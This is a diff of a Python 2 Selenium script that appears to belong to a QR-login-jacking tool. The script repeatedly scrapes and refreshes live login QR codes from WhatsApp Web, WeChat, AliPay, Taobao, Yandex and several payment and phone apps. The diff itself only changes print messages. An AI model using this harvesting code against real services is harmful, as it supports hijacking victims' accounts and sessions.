@@ -90,7 +90,6 @@ def whatsapp():
 	time.sleep(5)
 
 	while True:
-		print "-- --- -- --- -- --- -- --- -- --- --"
 		try:
 			button = driver.find_element_by_class_name('qr-button')
 			print " [*] Idle detected, Reloading QR code image (Good job WhatsApp)..."
@@ -102,7 +101,7 @@ def whatsapp():
 		try:
 			img = driver.find_elements_by_tag_name('img')[0]
 			src = img.get_attribute('src').replace("data:image/png;base64,","")
-			print " [*] The QR code image found !"
+			print " [*] QR code image detected !"
 			print " [*] Downloading the image..."
 			binary_data = a2b_base64(src)
 			qr = open("tmp.png","wb")
@@ -116,17 +115,16 @@ def whatsapp():
 
 #make("svg")
 def Yandex():
-	print "\n-- --- -- --- -- --- -- --- -- --- --"
 	driver = create_driver()
 	time.sleep(5)
 	print " [*] Navigating To Website.."
 	driver.get("https://passport.yandex.com/auth?mode=qr")
 	time.sleep(5)
 	while True:
-		print "-- --- -- --- -- --- -- --- -- --- --"
+		
 		try:
 			img_url = "https://passport.yandex.com" + driver.find_element_by_class_name("qr-code__i").get_attribute("style").split("\"")[1].encode("utf-8")
-			print " [*] The QR code image found !"
+			print " [*] QR code image detected !"
 			data = urllib.urlopen(img_url).read()
 			print " [*] Downloading the image.."
 			f = open("tmp.svg","w").write(data)
@@ -147,7 +145,7 @@ def Airdroid():
 	img_number = 16
 	refresh = 0
 	while True:
-		print "-- --- -- --- -- --- -- --- -- --- --"
+		
 		try:
 			button = driver.find_element_by_class_name("widget-login-refresh-qrcode")[0]
 			print " [*] Clicking to reload QR code image..."
@@ -158,7 +156,7 @@ def Airdroid():
 		try:
 			imgs = driver.find_elements_by_tag_name('img')
 			img = imgs[img_number]
-			print " [*] The QR code image found !"
+			print " [*] QR code image detected !"
 			src = img.get_attribute('src')
 			print " [*] Downloading the image.."
 			qr = urllib.urlretrieve(src, "tmp.png")
@@ -180,11 +178,11 @@ def Weibo():
 	driver.get("http://weibo.com/login.php")
 	time.sleep(5)
 	while True:
-		print "-- --- -- --- -- --- -- --- -- --- --"
+		
 		try:
 			imgs = driver.find_elements_by_tag_name('img')
 			img = imgs[len(imgs)-1]
-			print " [*] The QR code image found !"
+			print " [*] QR code image detected !"
 			src = img.get_attribute('src')
 			print " [*] Downloading the image.."
 			qr = urllib.urlretrieve(src, "tmp.png")
@@ -203,11 +201,11 @@ def WeChat():
 	driver.get("https://web.wechat.com")
 	time.sleep(5)
 	while True:
-		print "-- --- -- --- -- --- -- --- -- --- --"
+		
 		try:
 			imgs = driver.find_elements_by_tag_name('img')
 			img = imgs[0]
-			print " [*] The QR code image found !"
+			print " [*] QR code image detected !"
 			src = img.get_attribute('src')
 			print " [*] Downloading the image.."
 			qr = urllib.urlretrieve(src, "tmp.png")
@@ -224,7 +222,7 @@ def AliPay():
 	driver.get("https://auth.alipay.com/login/index.htm")
 	time.sleep(10)
 	while True:
-		print "-- --- -- --- -- --- -- --- -- --- --"
+		
 		try:
 			c = driver.find_element_by_class_name('ui-nav')[0]
 			t = c.find_elements_by_tag_name("li")[0]
@@ -237,7 +235,7 @@ def AliPay():
 		try:
 			driver.save_screenshot('tmp.png') #screenshot entire page
 			img = driver.find_elements_by_tag_name("canvas")[0]
-			print " [*] The QR code image found !"
+			print " [*] QR code image detected !"
 			location = img.location
 			size = img.size
 			print " [*] Grabbing photo.."
@@ -258,7 +256,7 @@ def Taobao():
 	driver.get("https://login.taobao.com")
 	time.sleep(5)
 	while True:
-		print "-- --- -- --- -- --- -- --- -- --- --"
+		
 		try:
 			button_class = web.find_element_by_class_name("msg-err")
 			button = button_class.find_elements_by_tag_name("a")[0]
@@ -270,7 +268,7 @@ def Taobao():
 		try:
 			imgs = driver.find_elements_by_tag_name('img')
 			img = imgs[0]
-			print " [*] The QR code image found !"
+			print " [*] QR code image detected !"
 			src = img.get_attribute('src')
 			print " [*] Downloading the image.."
 			qr = urllib.urlretrieve(src, "tmp.png")
@@ -287,11 +285,11 @@ def mydigipass():
 	driver.get("https://www.mydigipass.com/en/fp/signin/smartphone/qr")
 	time.sleep(5)
 	while True:
-		print "-- --- -- --- -- --- -- --- -- --- --"
+		
 		try:
 			imgs = driver.find_elements_by_tag_name('img')
 			img = imgs[1]
-			print " [*] The QR code image found !"
+			print " [*] QR code image detected !"
 			src = img.get_attribute('src')
 			print " [*] Downloading the image.."
 			qr = urllib.urlretrieve(src, "tmp.png")
@@ -310,11 +308,11 @@ def Zapper():
 	driver.get("https://www.zapper.com/login.php")
 	time.sleep(5)
 	while True:
-		print "-- --- -- --- -- --- -- --- -- --- --"
+		
 		try:
 			c = web.find_elements_by_id("qrcodecontainer2")
 			img = c[0].find_elements_by_tag_name("img")[0]
-			print " [*] The QR code image found !"
+			print " [*] QR code image detected !"
 			src = img.get_attribute('src')
 			print " [*] Downloading the image.."
 			qr = urllib.urlretrieve(src, "tmp.png")
@@ -334,11 +332,11 @@ def Trustly_App():
 	driver.get("https://trustlyapp.com/backend")
 	time.sleep(5)
 	while True:
-		print "-- --- -- --- -- --- -- --- -- --- --"
+		
 		try:
 			c = web.find_elements_by_class_name("qrcode-tab")[0]
 			img = c.find_elements_by_tag_name("img")[0]
-			print " [*] The QR code image found !"
+			print " [*] QR code image detected !"
 			src = img.get_attribute('src')
 			print " [*] Downloading the image.."
 			qr = urllib.urlretrieve(src, "tmp.png")
@@ -355,10 +353,10 @@ def Yelophone():
 	driver.get("https://www.yelophone.com/app#/login")
 	time.sleep(5)
 	while True:
-		print "-- --- -- --- -- --- -- --- -- --- --"
+		
 		try:
 			c = web.find_elements_by_id("qrcode")[0]
-			print " [*] The QR code image found !"
+			print " [*] QR code image detected !"
 			src = c.get_attribute("src")
 			print " [*] Downloading the image.."
 			qr = open("tmp.png","wb").write( requests.get( c.get_attribute("src") ).content )
@@ -593,11 +591,11 @@ def First_Method(classname,url,image_number,s=10):
 	driver.get(url)
 
 	while True:
-		print "-- --- -- --- -- --- -- --- -- --- --"
+		
 		try:
 			login = driver.find_element_by_class_name(classname)
 			img = login.find_elements_by_tag_name('img')[int(image_number)]
-			print " [*] The QR code image found !"
+			print " [*] QR code image detected !"
 			src = img.get_attribute('src')
 			print " [*] Downloading the image.."
 			qr = urllib.urlretrieve(src, "tmp.png")
@@ -616,11 +614,11 @@ def Second_Method(url,image_number,s=10):
 	driver.get(url)
 	time.sleep(5)
 	while True:
-		print "-- --- -- --- -- --- -- --- -- --- --"
+		
 		try:
 			imgs = driver.find_elements_by_tag_name('img')
 			img = imgs[int(image_number)]
-			print " [*] The QR code image found !"
+			print " [*] QR code image detected !"
 			src = img.get_attribute('src')
 			print " [*] Downloading the image.."
 			qr = urllib.urlretrieve(src, "tmp.png")
@@ -639,11 +637,11 @@ def Third_Method(url,image_number,s=10):
 	driver.get(url)
 	time.sleep(10)
 	while True:
-		print "-- --- -- --- -- --- -- --- -- --- --"
+		
 		try:
 			driver.save_screenshot('tmp.png') #screenshot entire page
 			img = driver.find_elements_by_tag_name("img")[int(image_number)]
-			print " [*] The QR code image found !"
+			print " [*] QR code image detected !"
 			location = img.location
 			size = img.size
 			print " [*] Grabbing photo.."
